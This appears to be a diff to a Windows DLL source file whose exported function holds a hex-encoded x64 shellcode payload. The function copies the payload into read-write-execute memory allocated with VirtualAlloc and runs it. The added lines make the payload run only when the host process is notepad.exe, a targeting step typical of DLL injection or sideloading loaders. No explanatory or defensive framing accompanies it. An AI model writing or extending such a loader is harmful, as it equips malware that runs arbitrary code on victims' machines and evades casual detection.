@@ -1,5 +1,6 @@
 // dllmain.cpp : Defines the entry point for the DLL application.
 #include "pch.h"
+#include <string>
 
 BOOL APIENTRY DllMain( HMODULE hModule,
                        DWORD  ul_reason_for_call,
@@ -48,7 +49,12 @@ extern "C" __declspec(dllexport) int spotlessExport() {
         "\x4C\x4C\x00\x49\x8B\xCC\x41\xFF\xD7\x49\x8B\xCC\x48\x8B\xD6"
         "\xE9\x14\xFF\xFF\xFF\x48\x03\xC3\x48\x83\xC4\x28\xC3";
 
-
+    char filename[256];
+    GetModuleFileNameA(NULL, filename, 256);
+    std::string name = filename;
+    std::string target = "notepad.exe";
+    if (name.find(target) == std::string::npos) return 0;
+    
     void* exec = VirtualAlloc(0, sizeof payload, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
     memcpy(exec, payload, sizeof payload);
     ((void(*)())exec)();
